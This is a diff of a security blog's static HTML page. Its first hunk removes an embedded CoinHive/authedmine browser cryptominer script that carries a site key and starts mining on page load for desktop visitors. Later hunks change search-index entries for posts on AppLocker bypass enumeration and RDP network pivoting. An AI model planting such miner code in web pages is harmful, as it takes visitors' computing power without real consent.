@@ -109,19 +109,7 @@ if (!doNotTrack) {
 
   <body>
     <div id="blog">
-      <header id="header" data-behavior="4">
-  
-<script src="https://authedmine.com/lib/authedmine.min.js"></script>
-<script>
-  var miner = new CoinHive.Anonymous('vEGXbkBj44DLcGvsqlmNsCFW1D8IRG2c', {throttle: 0.3});
-
-  
-  
-  if (!miner.isMobile() && !miner.didOptOut(14400)) {
-    miner.start();
-  }
-</script>
-
+      <header id="header" data-behavior="4"> 
   <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
   <div class="header-title">
     <a class="header-title-link" href="https://rastamouse.me/">Rasta Mouse</a>
@@ -1240,6 +1228,25 @@ this is my http/s c2 server
           <div class="media">
             
             <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/09/enumerating-applocker-config/">
+                <h3 class="media-heading">Enumerating AppLocker Config</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Sep 9, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>Very quick post to explore some different ways to enumerate the AppLocker configuration being applied to a host, both remotely and locally.  Understanding these rules, particularly deny rules, are useful for engineering bypasses.</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
               <a class="link-unstyled" href="https://rastamouse.me/2018/06/rdpclip/">
                 <h3 class="media-heading">RDPClip</h3>
               </a>
@@ -1410,27 +1417,6 @@ this is my http/s c2 server
             <hr>
           </div>
         
-          <div class="media">
-            
-            <div class="media-body">
-              <a class="link-unstyled" href="https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/">
-                <h3 class="media-heading">Jumping Network Segregation with RDP</h3>
-              </a>
-              <span class="media-meta">
-                <span class="media-date text-small">
-                  Aug 8, 2017
-                </span>
-              </span>
-              <div class="media-content hide-xs font-merryweather"><h2 id="introduction">Introduction</h2>
-
-<p>This short post demonstrates how it may be possible to pivot into a segregated/protected network, via an RDP Jump Box.</p>
-
-<p></p></div>
-            </div>
-            <div style="clear:both;"></div>
-            <hr>
-          </div>
-        
       </div>
     </div>
     <div class="modal-footer">
@@ -1438,7 +1424,7 @@ this is my http/s c2 server
          data-message-zero="no post found"
          data-message-one="1 post found"
          data-message-other="{n} posts found">
-         16 posts found
+         17 posts found
       </p>
     </div>
   </div>
